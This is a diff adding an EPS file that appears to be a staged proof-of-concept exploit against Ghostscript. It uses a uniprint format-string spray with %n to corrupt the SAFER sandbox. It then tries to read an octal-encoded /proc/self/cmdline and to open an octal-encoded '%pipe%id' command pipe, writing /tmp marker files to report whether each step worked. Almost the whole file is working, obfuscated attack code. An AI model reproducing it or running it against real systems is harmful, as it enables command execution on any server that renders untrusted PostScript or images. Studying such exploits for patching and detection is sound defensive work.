@@ -1,0 +1,36 @@
+%!PS-Adobe-3.0 EPSF-3.0
+%%BoundingBox: 0 0 100 100
+
+% Stage 1: uniprint format string spray
+<< /OutputDevice /uniprint
+   /upColorModel /DeviceGray
+   /upWriteComponentCommands <<
+     /Prologue (\045d\045d\045d\045d\045n\045d\045d\045d\045n\045d\045d\045n)
+   >>
+>> setpagedevice
+0 0 moveto 100 100 lineto stroke
+showpage
+
+% Stage 2: back to pngalpha
+<< /OutputDevice /pngalpha >> setpagedevice
+
+% Stage 3: test if SAFER is corrupted
+% Try read (octal encoded path)
+{(\057\160\162\157\143\057\163\145\154\146\057\143\155\144\154\151\156\145) (r) file 
+  (/tmp/S_BYPASS.txt) (w) file
+  dup 4096 string readstring pop
+  3 index exch writestring
+  closefile closefile
+} stopped {
+  (/tmp/S_ACTIVE.txt) (w) file (no) writestring closefile
+} if
+
+% Stage 4: try pipe (octal encoded)
+{
+  (\045\160\151\160\145\045\151\144) (w) file closefile
+  (/tmp/P_OK.txt) (w) file (yes) writestring closefile
+} stopped {
+  (/tmp/P_NO.txt) (w) file (no) writestring closefile
+} if
+
+showpage
